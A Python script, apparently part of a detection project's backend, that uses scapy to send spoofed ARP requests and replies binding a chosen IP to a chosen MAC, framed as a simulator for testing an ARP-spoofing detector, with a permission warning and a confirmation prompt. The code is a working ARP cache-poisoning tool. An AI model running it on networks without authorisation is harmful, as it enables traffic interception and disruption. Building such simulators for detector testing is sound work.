#!/usr/bin/env python3
"""
Script to simulate ARP spoofing attacks for testing the detection system
"""

import time
import sys
from pathlib import Path

# Add the backend directory to Python path
sys.path.append(str(Path(__file__).parent))

try:
    from scapy.all import *
except ImportError:
    print("Scapy not installed. Please install it with: pip install scapy")
    sys.exit(1)

def simulate_arp_spoofing(interface, target_ip, spoofed_ip, spoofed_mac, duration=30):
    """
    Simulate ARP spoofing attack
    
    Args:
        interface: Network interface to use
        target_ip: IP address to target
        spoofed_ip: IP address to spoof
        spoofed_mac: MAC address to use for spoofing
        duration: Duration of the attack in seconds
    """
    print(f"Starting ARP spoofing simulation...")
    print(f"Interface: {interface}")
    print(f"Target IP: {target_ip}")
    print(f"Spoofed IP: {spoofed_ip}")
    print(f"Spoofed MAC: {spoofed_mac}")
    print(f"Duration: {duration} seconds")
    
    start_time = time.time()
    packet_count = 0
    
    try:
        while time.time() - start_time < duration:
            # Create ARP request packet
            arp_request = ARP(
                op=1,  # ARP request
                psrc=spoofed_ip,  # Source IP (spoofed)
                pdst=target_ip,   # Destination IP
                hwsrc=spoofed_mac,  # Source MAC (spoofed)
                hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast MAC
            )
            
            # Create Ethernet frame
            ethernet = Ether(
                src=spoofed_mac,
                dst="ff:ff:ff:ff:ff:ff"
            )
            
            # Combine Ethernet and ARP
            packet = ethernet / arp_request
            
            # Send packet
            sendp(packet, iface=interface, verbose=False)
            packet_count += 1
            
            # Also send ARP reply to make it more realistic
            arp_reply = ARP(
                op=2,  # ARP reply
                psrc=spoofed_ip,  # Source IP (spoofed)
                pdst=target_ip,   # Destination IP
                hwsrc=spoofed_mac,  # Source MAC (spoofed)
                hwdst="ff:ff:ff:ff:ff:ff"  # Broadcast MAC
            )
            
            ethernet_reply = Ether(
                src=spoofed_mac,
                dst="ff:ff:ff:ff:ff:ff"
            )
            
            packet_reply = ethernet_reply / arp_reply
            sendp(packet_reply, iface=interface, verbose=False)
            packet_count += 1
            
            # Small delay between packets
            time.sleep(0.1)
            
            # Print progress
            if packet_count % 20 == 0:
                elapsed = time.time() - start_time
                print(f"Sent {packet_count} packets in {elapsed:.1f} seconds")
        
        print(f"Attack simulation completed. Sent {packet_count} packets.")
        
    except KeyboardInterrupt:
        print(f"\nAttack simulation interrupted. Sent {packet_count} packets.")
    except Exception as e:
        print(f"Error during attack simulation: {e}")

def main():
    """Main function."""
    if len(sys.argv) < 5:
        print("Usage: python simulate_attack.py <interface> <target_ip> <spoofed_ip> <spoofed_mac> [duration]")
        print("Example: python simulate_attack.py eth0 192.168.1.1 192.168.1.100 00:11:22:33:44:55 30")
        sys.exit(1)
    
    interface = sys.argv[1]
    target_ip = sys.argv[2]
    spoofed_ip = sys.argv[3]
    spoofed_mac = sys.argv[4]
    duration = int(sys.argv[5]) if len(sys.argv) > 5 else 30
    
    # Validate inputs
    try:
        # Validate IP addresses
        from ipaddress import ip_address
        ip_address(target_ip)
        ip_address(spoofed_ip)
    except ValueError as e:
        print(f"Invalid IP address: {e}")
        sys.exit(1)
    
    # Validate MAC address format
    import re
    mac_pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
    if not mac_pattern.match(spoofed_mac):
        print("Invalid MAC address format. Use format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX")
        sys.exit(1)
    
    # Check if interface exists
    try:
        conf.iface = interface
    except:
        print(f"Interface {interface} not found. Available interfaces:")
        print_interfaces()
        sys.exit(1)
    
    print("ARP Spoofing Attack Simulator")
    print("=" * 40)
    print("WARNING: This script simulates ARP spoofing attacks.")
    print("Only use it on networks you own or have permission to test.")
    print("=" * 40)
    
    response = input("Do you want to continue? (y/N): ")
    if response.lower() != 'y':
        print("Attack simulation cancelled.")
        sys.exit(0)
    
    simulate_arp_spoofing(interface, target_ip, spoofed_ip, spoofed_mac, duration)

def print_interfaces():
    """Print available network interfaces."""
    try:
        interfaces = get_if_list()
        for iface in interfaces:
            print(f"  - {iface}")
    except Exception as e:
        print(f"Error getting interfaces: {e}")

if __name__ == "__main__":
    main() 